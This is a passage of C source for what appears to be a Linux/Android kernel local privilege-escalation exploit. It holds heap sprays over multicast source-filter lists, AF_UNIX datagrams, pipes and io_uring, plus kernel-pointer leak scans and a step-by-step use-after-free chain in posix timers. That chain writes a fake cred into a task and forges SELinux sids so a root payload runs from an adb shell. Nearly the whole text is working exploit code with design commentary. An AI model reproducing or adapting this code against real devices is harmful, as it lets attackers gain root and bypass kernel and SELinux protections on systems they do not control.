		if (getsockopt(fd, IC_MCAST_IPV6, IC_MCAST_MSFILTER, &gf, &len))
			continue;
		for (k = 0; k < IC_MCAST_NSRC; k++)
			memcpy(data + k * 16,
			       (unsigned char *)&gf.slist[k] + 8, 16);
		/* node offsets inside a 256-byte object: the page offset of
		 * the node is (0x78 + 0x108 * slot) & 0xfff, and its low byte
		 * is the offset inside the object. */
		for (k = 0; k < 31; k++) {
			unsigned int off = (0x78 + k * IC_REAP_SLOT_STRIDE) &
					   0xfffU;
			unsigned int lo = off & 0xffU;
			uint64_t v;

			if (lo < 0x18 || lo + 0x18 > 0xf8) {
				hit->unsafe++;
				continue;
			}
			memcpy(&v, data + (lo - 0x18), 8);
			if (!ic_is_kernel_pointer(v))
				continue;
			if ((v & 0xfffUL) != (unsigned long)off) {
				hit->odd++;
				continue;
			}
			if (!hit->hits) {
				hit->value = v;
				hit->sock = sock;
				hit->group = j;
				hit->off = off;
				hit->ordinal = sock * ic_mcast.groups + j;
			}
			hit->hits++;
		}
	}
}

static void ic_mcast_scan(struct ic_mcast_hit *hit)
{
	unsigned int i;

	memset(hit, 0, sizeof(*hit));
	for (i = 0; i < ic_mcast.nfd; i++)
		ic_mcast_scan_fd(hit, ic_mcast.fds[i], 1, ic_mcast.groups, i);
	if (ic_mcast.tail)
		ic_mcast_scan_fd(hit, ic_mcast.tailfd, 1, ic_mcast.tail,
				 ic_mcast.nfd);
}

static void ic_mcast_cleanup(void)
{
	unsigned int i;

	if (!ic_mcast.fds)
		return;
	for (i = 0; i < ic_mcast.nfd; i++)
		if (ic_mcast.fds[i] >= 0)
			close(ic_mcast.fds[i]);
	if (ic_mcast.tailfd >= 0)
		close(ic_mcast.tailfd);
	free(ic_mcast.fds);
	memset(&ic_mcast, 0, sizeof(ic_mcast));
}

/* ---------------- psl in-place rewrite (mcast D2 chain) ------------------
 *
 * The leak gives X = S + 0x108*k + 0x78, S = X & ~0x1fff, and X sits inside
 * one psl whose 14 source slots (16 bytes each) cover the resident window
 * [S + 0x100*O + 0x18, S + 0x100*O + 0xf8).  The same object is editable:
 * MCAST_BLOCK_SOURCE deletes the first entry equal to the address it is
 * given (shifting the rest down, leaving the bytes above sl_count where they
 * were) and MCAST_UNBLOCK_SOURCE appends one.  Nothing reallocates as long
 * as sl_count stays under sl_max == 14, so the window behaves like 14
 * user-controlled 16-byte words whose "write" is an append at slot sl_count.
 *
 * Three images are used, all precomputed by gen_mcast_tables.py from the
 * model in mcastrel4.py:
 *   P_base  identical in every 0x100-aligned block of the slab: the fake
 *           cred / user_ns / ucounts / user / group_info and the SELinux
 *           tsec, so the winner's cred pointer resolves whichever block the
 *           block O ordinal maps to;
 *   P_s1    parks the winner in the firing loop (it_lock = 1); its handling
 *           word leaks the task pointer back through getsockopt();
 *   P_s2    releases the winner and erases the node against the real
 *           timerqueue head, which stores the fake cred address into
 *           winner->cred.
 * The stage-2 image has to be written while the winner is parked, and the
 * release itself is the append that lands on the slot holding it_lock.  The
 * appends after that are part of the same window (~13 setsockopt calls,
 * microseconds), while the next collect runs from the winner's task-work
 * tick, so the parked task never sees a partially written image.
 */
#define IC_MC_NC 14
#define IC_MC_RES0 0x18
#define IC_MC_MARGIN 40
/* MCAST_BLOCK_SOURCE is ip6_mc_source(add=1, MCAST_EXCLUDE): it *appends*
 * at sl_count.  MCAST_UNBLOCK_SOURCE is ip6_mc_source(add=0, MCAST_EXCLUDE):
 * it deletes the first equal entry and shifts the rest down.  Both require
 * the psl's sfmode to be MCAST_EXCLUDE, which is why the spray's msfilter
 * has to say EXCLUDE (1) and not the INCLUDE (0) it used to. */
#define IC_MC_ADD_SOURCE 43
#define IC_MC_DEL_SOURCE 44
#define IC_MC_ORD_NONE 0xffffffffU

struct ic_mc_gsr {
	uint32_t iface;
	struct ic_mcast_ss group;
	struct ic_mcast_ss source;
} __attribute__((aligned(8)));

static struct {
	const struct ic_mcast_case *cs;
	unsigned int ord;
	uint64_t slab;
	uint64_t cred;
	uint64_t winner;
	/* Set once P_s1 is in place: from then on a dead attempt must hang
	 * instead of returning, and sid writes go through the ordinal. */
	int active;
	/* Set as soon as the mcast scan shows B's erase wrote X into a psl.
	 * From that point an exiting attempt walks the erased node from
	 * release_task() and WARNs in timerqueue_del() (or erases through a
	 * pattern we wrote), which panic_on_warn turns into a reboot. */
	int leak;
} g_mc = { .ord = IC_MC_ORD_NONE };

static _Atomic unsigned int g_mc_sid_req;
static _Atomic unsigned int g_mc_sid_ack;

/* Where the last psl edit died: 1 read-back, 2 delete, 3 add. */
static unsigned int g_mc_errno;
static unsigned int g_mc_step;
static unsigned int g_mc_idx;

static void ic_mc_note(unsigned int step, unsigned int idx, int err)
{
	g_mc_step = step;
	g_mc_idx = idx;
	g_mc_errno = (unsigned int)(err < 0 ? -err : err);
}

static unsigned int ic_mc_total(void)
{
	return ic_mcast.nfd * ic_mcast.groups + ic_mcast.tail;
}

/* Spray ordinal -> (socket, group).  Regular sockets hold groups 1..groups
 * (shared by all of them), the tail socket holds groups 1..tail. */
static int ic_mc_lookup(unsigned int ord, int *fdp, unsigned int *gp)
{
	unsigned int per = ic_mcast.groups;

	if (!per || !ic_mcast.fds)
		return -1;
	if (ord < ic_mcast.nfd * per) {
		*fdp = ic_mcast.fds[ord / per];
		*gp = 1 + ord % per;
		return 0;
	}
	ord -= ic_mcast.nfd * per;
	if (ord >= ic_mcast.tail || ic_mcast.tailfd < 0)
		return -1;
	*fdp = ic_mcast.tailfd;
	*gp = 1 + ord;
	return 0;
}

/* Read the 14 source slots of one psl.  The container is filled with 14
 * entries, so numsrc comes back as 14 unless the object changed shape. */
static int ic_mc_get(unsigned int ord, unsigned char img[IC_MC_NC][16],
		     unsigned int *count)
{
	struct ic_mcast_gf gf;
	socklen_t len = sizeof(gf);
	unsigned int k, g;
	int fd;

	if (ic_mc_lookup(ord, &fd, &g))
		return -1;
	ic_mcast_fill_gf(&gf, g, (int)ic_mcast.ifidx);
	if (getsockopt(fd, IC_MCAST_IPV6, IC_MCAST_MSFILTER, &gf, &len))
		return -1;
	*count = gf.numsrc;
	if (*count > IC_MC_NC)
		return -1;
	for (k = 0; k < IC_MC_NC; k++) {
		if (k < *count)
			memcpy(img[k], (unsigned char *)&gf.slist[k] + 8, 16);
		else
			memset(img[k], 0, 16);
	}
	return 0;
}

/* One in-place append / first-match delete. */
static int ic_mc_edit(unsigned int ord, int optname, const unsigned char *src)
{
	struct ic_mc_gsr r;
	unsigned int g;
	int fd;

	if (ic_mc_lookup(ord, &fd, &g))
		return -1;
	memset(&r, 0, sizeof(r));
	r.iface = (uint32_t)ic_mcast.ifidx;
	ic_mcast_set_group(&r.group, g, (int)ic_mcast.ifidx);
	((unsigned char *)&r.source)[0] = 10;	/* AF_INET6 */
	memcpy((unsigned char *)&r.source + 8, src, 16);
	if (sizeof(r) != 264)
		return -1;
	if (!setsockopt(fd, IC_MCAST_IPV6, optname, &r, sizeof(r)))
		return 0;
	ic_mc_note(optname == IC_MC_ADD_SOURCE ? 3 : 2, 0, errno);
	return -1;
}

/* Delete every current source, then append dst[0..13]. */
static int ic_mc_write(unsigned int ord, const unsigned char dst[IC_MC_NC][16])
{
	unsigned char img[IC_MC_NC][16];
	unsigned int count, i;

	if (ic_mc_get(ord, img, &count)) {
		ic_mc_note(1, 0, 0);
		return -1;
	}
	for (i = 0; i < count; i++)
		if (ic_mc_edit(ord, IC_MC_DEL_SOURCE, img[i])) {
			g_mc_idx = i;
			return -1;
		}
	for (i = 0; i < IC_MC_NC; i++)
		if (ic_mc_edit(ord, IC_MC_ADD_SOURCE, dst[i])) {
			g_mc_idx = i;
			return -1;
		}
	return 0;
}

/* Materialise one pattern: literals plus the 8-byte words relocated by the
 * slab base (kind 1) or by the winner task (kind 2). */
static void ic_mc_build(const struct ic_mcast_pat *pat, uint64_t slab,
			uint64_t winner, unsigned char out[IC_MC_NC][16])
{
	unsigned int k, h;

	for (k = 0; k < IC_MC_NC; k++) {
		const struct ic_mcast_chunk *c = &pat->c[k];
		unsigned char *o = out[k];

		memcpy(o, c->lit, 16);
		for (h = 0; h < 2; h++) {
			uint64_t v;

			if (!c->rel[h])
				continue;
			v = (c->rel[h] == 1 ? slab : winner) + c->off[h];
			memcpy(o + h * 8, &v, 8);
		}
	}
}

static const struct ic_mcast_case *ic_mc_case_for(unsigned int l)
{
	unsigned int i;

	for (i = 0; i < IC_MC_CASES; i++)
		if (ic_mcast_cases[i].l == l)
			return &ic_mcast_cases[i];
	return NULL;
}

/* Block-relative residue -> image word.  The window is not 8-aligned in
 * general, so reads go byte by byte. */
static uint64_t ic_mc_word(const unsigned char img[IC_MC_NC][16],
			   unsigned int res, unsigned int n)
{
	unsigned char tmp[8] = { 0 };
	unsigned int i;
	uint64_t v;

	if (n > 8)
		n = 8;
	for (i = 0; i < n; i++) {
		unsigned int r = (res + i) & 0xffU;
		unsigned int d;

		if (r < IC_MC_RES0 || r >= 0xf8)
			return 0;
		d = r - IC_MC_RES0;
		tmp[i] = img[d >> 4][d & 0xfU];
	}
	memcpy(&v, tmp, 8);
	return v;
}

static void ic_mc_poke(unsigned char img[IC_MC_NC][16], unsigned int res,
		       unsigned int n, uint64_t v)
{
	unsigned int i;

	for (i = 0; i < n; i++) {
		unsigned int r = (res + i) & 0xffU;
		unsigned int d;

		if (r < IC_MC_RES0 || r >= 0xf8)
			return;
		d = r - IC_MC_RES0;
		img[d >> 4][d & 0xf] = (unsigned char)(v >> (8 * i));
	}
}

/* ---- parked rewrite -----------------------------------------------------
 *
 * T1 (the image a parked winner leaves behind) is read back first.  Nineteen
 * of its 14 slots must be pairwise distinct: the deletes are by value and
 * the value has to be unique to hit the intended slot.
 *
 * Deletes run tail first down to the slot holding it_lock, then from the
 * front down to zero.  A front delete only writes slots 0..sl_count-2, so
 * the it_lock slot keeps its bytes for the whole delete phase, which is what
 * keeps the winner parked.  The lock word is 4 bytes and never straddles an
 * 8-byte half of a 16-byte slot for the seven feasible L values, so the
 * append that lands on that slot either leaves the winner parked or releases
 * it atomically.
 *
 * Slot k is appended by the (k+1)-th append, so the release happens at
 * append c_lock and slots c_lock+1..13 follow it.  They must not be read
 * back in between: the winner is free from that point on and the next
 * collect is one tick away.
 */
static int ic_mc_replace_parked(unsigned int ord,
				const struct ic_mcast_case *cs,
				const unsigned char dst[IC_MC_NC][16])
{
	unsigned char img[IC_MC_NC][16];
	unsigned int count, i, k;

	if (ic_mc_get(ord, img, &count) || count != IC_MC_NC)
		return -1;
	for (i = 0; i < IC_MC_NC; i++)
		for (k = i + 1; k < IC_MC_NC; k++)
			if (!memcmp(img[i], img[k], 16))
				return -1;
	if ((ic_mc_word(img, cs->r0, 4) & 1U) == 0)
		return -1;	/* the winner is not parked */
	/* Tail deletes.  The lock slot is only readable while sl_count still
	 * covers it, i.e. reuse the read-back of every delete that leaves
	 * count > c_lock.  The delete that takes the count to c_lock removes
	 * the lock slot as the last entry, which shifts nothing. */
	while (count > cs->c_lock) {
		if (ic_mc_edit(ord, IC_MC_DEL_SOURCE, img[count - 1]))
			return -1;
		count--;
		if (count > cs->c_lock) {
			if (ic_mc_get(ord, img, &i) || i != count)
				return -1;
			if ((ic_mc_word(img, cs->r0, 4) & 1U) == 0)
				return -1;
		}
	}
	/* Front deletes.  Every shift writes slots 0..count-2, so the lock
	 * slot keeps its bytes for the rest of the delete phase. */
	while (count) {
		if (ic_mc_edit(ord, IC_MC_DEL_SOURCE, img[0]))
			return -1;
		count--;
		if (!count)
			break;
		if (ic_mc_get(ord, img, &i) || i != count)
			return -1;
	}
	for (k = 0; k <= cs->c_lock; k++)
		if (ic_mc_edit(ord, IC_MC_ADD_SOURCE, dst[k]))
			return -1;
	for (k = cs->c_lock + 1; k < IC_MC_NC; k++)
		if (ic_mc_edit(ord, IC_MC_ADD_SOURCE, dst[k]))
			return -1;
	return 0;
}

/* Patch the fake tsec's sid (residue sec+4) in the node's own block.
 *
 * The delete half of the rewrite is by value: UNBLOCK_SOURCE removes the
 * first entry equal to the address it is given.  The poke therefore has to
 * happen *after* the deletes -- writing the new sid into img[0] first makes
 * the first delete miss (the psl still holds the old value), which used to
 * fail the whole rewrite silently and leave every ctxmap clone on the old
 * (non-domain) sid. */
static int ic_mc_sid_write(unsigned int sid)
{
	unsigned char img[IC_MC_NC][16];
	unsigned int count, i;

	if (!g_mc.cs || g_mc.ord == IC_MC_ORD_NONE)
		return -1;
	if (ic_mc_get(g_mc.ord, img, &count))
		return -1;
	for (i = 0; i < count; i++)
		if (ic_mc_edit(g_mc.ord, IC_MC_DEL_SOURCE, img[i]))
			return -1;
	ic_mc_poke(img, (g_mc.cs->sec + 4) & 0xff, 4, sid);
	for (i = 0; i < IC_MC_NC; i++)
		if (ic_mc_edit(g_mc.ord, IC_MC_ADD_SOURCE, img[i]))
			return -1;
	return 0;
}

/*
 * AF_UNIX SOCK_DGRAM payload spray: the only order-1+ reclaim a plain
 * adb-shell process is allowed to perform.  The device policy grants every
 * domain unix_dgram_socket create/read/write (src_plat_sepolicy.cil:13950,
 * plat_pub_versioned.cil:6101) while packet_socket, io_uring and the
 * dma-buf heaps are denied to shell, so this is the shell-legal fallback
 * for the post-discard reclaim.
 *
 * unix_dgram_sendmsg() copies the whole payload at offset 0 of an skb data
 * area allocated with kmalloc(SKB_DATA_ALIGN(len) + sizeof(skb_shared_info)),
 * and sizeof(skb_shared_info) is 320 on this kernel (MAX_SKB_FRAGS 17).
 * len 7808 -> 8128 -> kmalloc-8k, and ksize() - 320 = 7872 bytes of user
 * payload: the entire old order-1 posix_timers slab (8192 bytes, 31
 * objects) fits in one datagram whose bytes are exactly what we sent.
 * kmalloc-8k slabs are order 3 with four 8K objects, so every object is 8K
 * aligned: if the spray captures the discarded posix slab page, the object
 * base is the old slab base and a stale timer node at address X sits at
 * payload offset X & 0x1fff.
 *
 * The queue scan is MSG_PEEK based: consuming a datagram frees its data
 * object, so only non-matching messages are drained and the message
 * carrying X stays queued.  The node reaches the head of its queue before
 * the scan stops, which is what a later in-place rewrite needs.
 */
#define IC_UNX_SOCKS 256
#define IC_UNX_MAX 1024
#define IC_UNX_PAYLOAD 7808U	/* 7808 + 320 = 8128 -> kmalloc-8k */
#define IC_UNX_OBJECT 0x2000UL
#define IC_UNX_SOCKBUF (4 * 1024 * 1024)
#define IC_UNX_MSGS 4096UL
#define IC_UNX_MSG_MAX 262144UL

struct ic_unx_spray {
	int (*fds)[2];
	unsigned int nsocks;
	unsigned int payload;
	unsigned long queued;
	unsigned char *pat;
	int prime[2];
	int prime_ok;
};

struct ic_unx_hit {
	uint64_t value;
	unsigned int pair;
	unsigned int obj_off;
	unsigned int hits;
	unsigned long scanned;
};

static struct ic_unx_spray ic_unx;

static int ic_unx_mkpairs(int (*fds)[2], unsigned int n)
{
	int bufsz = IC_UNX_SOCKBUF;
	unsigned int i;

	for (i = 0; i < n; i++) {
		if (socketpair(AF_UNIX, SOCK_DGRAM | SOCK_CLOEXEC, 0, fds[i]))
			break;
		(void)setsockopt(fds[i][0], SOL_SOCKET, SO_SNDBUF,
				 &bufsz, sizeof(bufsz));
		(void)setsockopt(fds[i][1], SOL_SOCKET, SO_RCVBUF,
				 &bufsz, sizeof(bufsz));
	}
	return (int)i;
}

/*
 * Create every socket before the chain: socket(), its file and its inode
 * are unmovable slab allocations and must not run between the pool free
 * and the first datagram.  One full kmalloc-8k slab is left queued on a
 * private pair so the active CPU slab is full and the first spray datagram
 * asks the buddy for a fresh order-3 slab instead of eating a warm free
 * object.
 */
static int ic_unx_prepare(void)
{
	const char *env;
	unsigned int want = IC_UNX_SOCKS;
	unsigned int i;
	struct rlimit rl;

	if (ic_unx.fds)
		return 0;
	env = getenv("IC_UNX_SOCKS");
	if (env) {
		unsigned long v = strtoul(env, NULL, 0);

		if (v && v <= IC_UNX_MAX)
			want = (unsigned int)v;
	}
	if (!getrlimit(RLIMIT_NOFILE, &rl)) {
		rlim_t need = (rlim_t)want * 2 + 16;

		if (rl.rlim_cur < need) {
			rl.rlim_cur = rl.rlim_max < need ? rl.rlim_max : need;
			(void)setrlimit(RLIMIT_NOFILE, &rl);
		}
	}
	ic_unx.fds = calloc(want, sizeof(*ic_unx.fds));
	ic_unx.pat = calloc(1, IC_UNX_PAYLOAD);
	if (!ic_unx.fds || !ic_unx.pat) {
		free(ic_unx.fds);
		free(ic_unx.pat);
		ic_unx.fds = NULL;
		ic_unx.pat = NULL;
		return -1;
	}
	ic_unx.payload = IC_UNX_PAYLOAD;
	/*
	 * Capture probe: every node slot gets a distinct non-canonical
	 * pointer in its rb_right field.  If the reap reads our datagram,
	 * the fault address becomes 0xbad0...0(k+1)0010 and names the slot;
	 * anything else means the page never became a spray object.
	 */
	env = getenv("IC_UNX_MARK");
	if (env) {
		unsigned int k;

		for (k = 0; k < IC_REAP_SLOTS; k++) {
			size_t o = 0x78 + (size_t)k * IC_REAP_SLOT_STRIDE + 8;
			uint64_t v = 0x0000bad000000000ULL |
				     ((uint64_t)(k + 1) << 12);

			if (o + sizeof(v) > IC_UNX_PAYLOAD)
				continue;
			memcpy(ic_unx.pat + o, &v, sizeof(v));
		}
		fprintf(stderr, "[unix] mark probe armed\n");
	}
	ic_unx.nsocks = (unsigned int)ic_unx_mkpairs(ic_unx.fds, want);
	ic_unx.prime_ok = ic_unx_mkpairs(&ic_unx.prime, 1) == 1;
	if (ic_unx.prime_ok) {
		unsigned int sent = 0;

		for (i = 0; i < 4; i++) {
			ssize_t r = send(ic_unx.prime[0], ic_unx.pat,
					 ic_unx.payload,
					 MSG_DONTWAIT | MSG_NOSIGNAL);

			if (r == (ssize_t)ic_unx.payload)
				sent++;
		}
		fprintf(stderr, "[unix] prime msgs=%u\n", sent);
	}
	fprintf(stderr, "[unix] prepare pairs=%u payload=%u fds_ok=%u\n",
		ic_unx.nsocks, ic_unx.payload, want);
	return ic_unx.nsocks ? 0 : -1;
}

static int ic_unx_spray(uint64_t target, struct ic_reap_result *res)
{
	const char *env;
	unsigned long max_msgs = IC_UNX_MSGS;
	unsigned long sent = 0;
	unsigned int i;

	(void)target;
	memset(res, 0, sizeof(*res));
	if (!ic_unx.fds || !ic_unx.nsocks)
		return -1;
	env = getenv("IC_UNX_MSGS");
	if (env) {
		unsigned long v = strtoul(env, NULL, 0);

		if (v && v <= IC_UNX_MSG_MAX)
			max_msgs = v;
	}
	for (i = 0; i < ic_unx.nsocks && sent < max_msgs; i++) {
		for (;;) {
			ssize_t r = send(ic_unx.fds[i][0], ic_unx.pat,
					 ic_unx.payload,
					 MSG_DONTWAIT | MSG_NOSIGNAL);

			if (r != (ssize_t)ic_unx.payload)
				break;
			sent++;
			if (sent >= max_msgs)
				break;
		}
	}
	ic_unx.queued = sent;
	fprintf(stderr, "[unix] spray msgs=%lu pairs=%u payload=%u\n",
		sent, ic_unx.nsocks, ic_unx.payload);
	return sent ? 0 : -1;
}

static void ic_unx_cleanup(void)
{
	unsigned int i;

	if (!ic_unx.fds)
		return;
	for (i = 0; i < ic_unx.nsocks; i++) {
		if (ic_unx.fds[i][0] >= 0)
			close(ic_unx.fds[i][0]);
		if (ic_unx.fds[i][1] >= 0)
			close(ic_unx.fds[i][1]);
	}
	if (ic_unx.prime_ok) {
		close(ic_unx.prime[0]);
		close(ic_unx.prime[1]);
	}
	free(ic_unx.fds);
	free(ic_unx.pat);
	memset(&ic_unx, 0, sizeof(ic_unx));
}

/*
 * Walk the queues without consuming the match: recv(MSG_PEEK) reads the
 * head datagram, and a non-matching head is then consumed so the next one
 * can be inspected.  The scan stops the moment X shows up at the head, so
 * the datagram carrying X is still queued when the caller parks.
 */
static int ic_unx_scan(struct ic_unx_hit *hit)
{
	unsigned char *buf;
	unsigned int i, k;
	unsigned long seen = 0;

	memset(hit, 0, sizeof(*hit));
	buf = malloc(ic_unx.payload);
	if (!buf)
		return -1;
	for (i = 0; i < ic_unx.nsocks && !hit->hits; i++) {
		for (;;) {
			ssize_t r = recv(ic_unx.fds[i][1], buf, ic_unx.payload,
					 MSG_PEEK | MSG_DONTWAIT);

			if (r <= 0)
				break;
			seen++;
			for (k = 0; k < IC_REAP_SLOTS; k++) {
				unsigned int o = 0x78 + k * IC_REAP_SLOT_STRIDE;
				uint64_t v;

				if ((size_t)o + sizeof(v) > (size_t)r)
					continue;
				memcpy(&v, buf + o, sizeof(v));
				if (!ic_is_kernel_pointer(v))
					continue;
				if ((v & 0xfffUL) !=
				    (unsigned long)(o & 0xfffUL))
					continue;
				if (!hit->hits) {
					hit->value = v;
					hit->pair = i;
					hit->obj_off = o;
				}
				hit->hits++;
			}
			if (hit->hits)
				break;
			/* Not X: free this datagram and look at the next. */
			if (recv(ic_unx.fds[i][1], buf, ic_unx.payload,
				 MSG_DONTWAIT) <= 0)
				break;
		}
	}
	hit->scanned = seen;
	free(buf);
	return hit->hits ? 0 : -1;
}

static int ic_reap_use_unix(void)
{
	const char *env = getenv("IC_SPRAY");

	return env && !strcmp(env, "unix");
}

static int ic_reap_use_pipe(void)
{
	const char *env = getenv("IC_SPRAY");

	return env && !strcmp(env, "pipe");
}

static int ic_reap_use_packet(void)
{
	const char *env = getenv("IC_SPRAY");

	return env && !strcmp(env, "packet");
}

static int ic_reap_use_ioring(void)
{
	const char *env = getenv("IC_SPRAY");

	return env && !strcmp(env, "ioring");
}

static int ic_reap_use_aio(void)
{
	return !ic_reap_use_pipe() && !ic_reap_use_packet() &&
	       !ic_reap_use_ioring() && !ic_reap_use_perf() &&
	       !ic_reap_use_rthdr() && !ic_reap_use_unix() &&
	       !ic_reap_use_mcast();
}

static int ic_reap_spray(uint64_t target, struct ic_reap_result *res)
{
	unsigned int i;
	uint64_t pc = 0;
	const char *env = getenv("IC_PC");

	if (ic_reap_use_pipe())
		return ic_reap_pipe_spray(target, res);
	if (ic_reap_use_unix())
		return ic_unx_spray(target, res);
	if (ic_reap_use_packet())
		return ic_packet_spray(target, res);
	if (ic_reap_use_ioring())
		return ic_ioring_spray(target, res);
	if (ic_reap_use_perf())
		return ic_perf_spray(target, res);
	if (ic_reap_use_rthdr())
		return ic_rthdr_spray(target, res);
	if (ic_reap_use_mcast())
		return ic_mcast_spray(target, res);
	if (env)
		pc = strtoull(env, NULL, 0);
	memset(&ic_reap_aio, 0, sizeof(ic_reap_aio));
	if (ic_allocate_aio_spray(&ic_reap_aio))
		return -1;
	for (i = 0; i < ic_reap_aio.count; i++)
		ic_reap_write_pattern(ic_reap_aio.pages[i], pc, target);
	memset(res, 0, sizeof(*res));
	res->pages = ic_reap_aio.pages;
	res->npages = ic_reap_aio.count;
	return 0;
}

/*
 * Pipe spray leak scan.  Pipe pages are not mapped into our address space,
 * so both our pattern and the kernel's RB_CLEAR_NODE() write have to be read
 * back with read(2).  Reading a page frees it; that is fine here because the
 * pipe spray is only used to prove that an order-0-only allocation path can
 * still capture X's page (io_setup() cannot: its kioctx/inode slab requests
 * run before the first ring page and can steal the freed order-1 block).
 */
static int ic_pipe_reap_scan(struct ic_reap_result *res)
{
	unsigned char *buf;
	unsigned long index = 0;
	unsigned int i, p, k;
	int rc = -1;

	buf = malloc(IC_PAGE);
	if (!buf)
		return -1;
	memset(res, 0, sizeof(*res));
	for (i = 0; i < ic_pipes.count; i++) {
		for (p = 0; p < ic_pipes.pages; p++) {
			ssize_t r = read(ic_pipes.fds[i][0], buf, IC_PAGE);

			if (r <= 0)
				break;
			for (k = 0; k < IC_REAP_SLOTS; k++) {
				unsigned int off = ((k * IC_REAP_SLOT_STRIDE +
						     0x78U) & 0xfffU);
				uint64_t v;

				memcpy(&v, buf + off, sizeof(v));
				if (!ic_is_kernel_pointer(v))
					continue;
				if ((v & 0xfffUL) != (unsigned long)off)
					continue;
				if (!res->hits) {
					res->leak = v;
					res->leak_page = index;
					res->leak_off = off;
				}
				res->hits++;
			}
			index++;
			if ((unsigned long)r != IC_PAGE)
				break;
		}
	}
	free(buf);
	if (res->hits)
		rc = 0;
	return rc;
}

static int ic_reap_scan(struct ic_reap_result *res)
{
	unsigned long i;
	unsigned int k;

	for (i = 0; i < res->npages; i++) {
		unsigned char *p = res->pages[i];

		for (k = 0; k < IC_REAP_SLOTS; k++) {
			unsigned int off = ((k * IC_REAP_SLOT_STRIDE +
					     0x78U) & 0xfffU);
			uint64_t v = *(uint64_t *)(p + off);

			if (!ic_is_kernel_pointer(v))
				continue;
			if ((v & 0xfffUL) != off)
				continue;
			if (!res->hits) {
				res->leak = v;
				res->leak_page = i;
				res->leak_off = off;
			}
			res->hits++;
		}
	}
	return res->hits ? 0 : -1;
}

/* ---------------- PEAK: deterministic detach + two-collect chain ----------
 *
 * Victim A dies through the non-leader exec() path.  Its k_itimer node stays
 * linked in the dead task's posix_cputimers while the object itself is freed
 * by call_rcu() on cpu0, so the slot returns to the cpu0 freelist.  Victim B
 * is forked next and B's exec thread timer_create() pops that same slot; B
 * dies and pushes it again; candidate 0 (armed on worker 0) pops it again.
 *
 * Reaping A runs cleanup_timerqueue() on A's base, whose leftmost node is the
 * live candidate 0 at the same address.  It writes ctmr->head = NULL into the
 * candidate and erases the node from A's tree only: worker 0's SCHED tqhead
 * keeps its reference, but cpu_timer_dequeue() on delete then sees head==NULL
 * and skips timerqueue_del(), so the dangling reference survives while the
 * object itself is freed.
 *
 * The freed slab is drained and reclaimed with io_uring blocks; reaping B
 * finally writes its stale node address into our page (RB_CLEAR_NODE), which
 * is the leak that tells us X.
 *
 * Stage 1 rebuilds the stale node inside the page with a fake
 * timerqueue_head also inside the page (so rb_erase_cached() never touches
 * the real base's cached leftmost), node.parent = scratch page address and
 * node.left = &node.expires.  The erase's case 1b stores the scratch address
 * (a canonical kernel VA, huge as u64) into node.expires; the second
 * collect iteration then returns it, the base goes quiet, and the firing
 * loop parks on it_lock == 1 with handling == winner left in the page.
 *
 * Stage 2 (winner known) points node.head at the real SCHED tqhead,
 * node.left at &winner->cred and node.parent at X+0x10, and sets node.pid to
 * U64_MAX so the second collect iteration (which now sees X+0x10 as a node)
 * returns instead of walking it.  Case 1b then writes X+0x10 into
 * winner->cred; after the collect completes we fill the fake cred at X+0x10
 * and let the workers try to escalate.
 */

/* 128 workers made the victim fork/exec race lose its scheduling window
 * under emulation (target threads starved on CPUs 1-3).  16 covers the
 * freelist positions observed so far (the slot is usually at index 1-3)
 * and has been reliable in both root and app modes. */
#define IC_PEAK_DEFAULT_WORKERS 16
#define IC_PEAK_MAX_WORKERS 192
#define IC_PEAK_CRED_DELTA 0x10
#define IC_PEAK_CRED_SIZE 0xb0
/* prepare_creds()/commit_creds() dereference cred->user (get_uid/free_uid),
 * cred->group_info (get_group_info/in_group_p), cred->user_ns (get_user_ns,
 * cap_capable) and cred->ucounts (get_ucounts).  None of those addresses is
 * known with KASLR, so the fakes live on the sibling page of the same leaked
 * order-1 block and are addressed with kernel VAs derived from the leaked
 * page.  The block stays allocated while the spraying io_uring fd is open,
 * and the winner process keeps it open.
 *
 * fork() goes through prepare_creds(), which unconditionally calls
 * get_ucounts(new->ucounts); get_ucounts_or_wrap() does
 * atomic_add_negative() on &ucounts->count, so ucounts must not be NULL.
 * inc_rlimit_ucounts() then walks ucounts->ns->ucounts, so the fake
 * user_namespace's ucounts field (0x210) must be NULL to end the walk. */
#define IC_FAKE_NS_OFF       0x000	/* user_namespace 0x298 */
#define IC_FAKE_UCOUNTS_OFF  0x2a0	/* ucounts 0x90 */
#define IC_FAKE_USER_OFF     0x340	/* user_struct 0xa8 */
#define IC_FAKE_GI_OFF       0x3f0	/* group_info 0x8 + gid[] */
#define IC_FAKE_ZONE_SIZE    0x400

struct ic_peak_worker {
	pthread_t thread;
	unsigned int index;
	_Atomic int ready;
	_Atomic int tid;
	clockid_t clockid;
	int candidate;
	int trigger;
	int candidate_live;
	int trigger_live;
};

static struct ic_peak_worker g_peak_workers[IC_PEAK_MAX_WORKERS];
static unsigned int g_peak_count;
static _Atomic int g_peak_release;
static int g_peak_fork_helper;
static int g_peak_trace;

/* ---- winner-side SELinux sid scan ----
 *
 * The numeric sid of a context is not observable from userspace, but an
 * unknown one is harmless: sidtab_search_core() falls back to the unlabeled
 * initial context, so a wrong candidate only makes the check fail.  The fake
 * tsec sits just below the reclaimed k_itimer (sec = page + off - 0x20), so
 * a candidate is written straight into sec->sid at page + off - 0x1c and the
 * real exec path judges it.  The winner forks one child per candidate; the
 * child execs the payload with argv[0] == "timer-poc", which acknowledges
 * from the new image through an inherited pipe.  A byte left by the old
 * image is an exec failure, EOF is a child that died before exec.
 */
#define IC_SCAN_DEFAULT_MAX 4096
#define IC_SCAN_TIMEOUT_NS (200L * 1000 * 1000)
#define IC_SCAN_ACK 'K'
/* Four bytes written by the payload after it reached its own verdict
 * (exec ok, capability check denied) are tagged with this high word so
 * they cannot be mistaken for an execve() errno written by the old
 * image, which is always a small positive number. */
#define IC_SCAN_VERDICT 0x1c5a0000u

static int g_peak_scan_mode;
static _Atomic unsigned int g_peak_fake_uid;
static volatile uint32_t *g_peak_scan_sid;
/* Harness-only: put this numeric sid into the fake task_security_struct
 * instead of SECINITSID_KERNEL.  On the device the fake cred has to carry
 * the running domain's sid (shell) or the policy rejects the helper exec. */
static unsigned int g_peak_sid_override;
static const char *g_peak_scan_exec;
static const char *g_peak_policy_path;
static const char *g_peak_probe_path;
static const char *g_peak_probe_label;
static const char *g_peak_exec_label;
static const char *g_peak_scan_ctxs;
static const char *g_peak_access_file;
static int g_peak_scan_inproc;
static int g_peak_scan_all;
static int g_peak_ctxmap;
static const char *g_peak_ctxmap_target;
/* Harness-only: once the drop child has exec'd the payload, report success
 * so main can power the run down.  On the device this stays off: the
 * attempt process must keep the psl (and the fake tsec the payload uses)
 * allocated for as long as the root payload runs. */
static int g_scan_exit_after_drop;
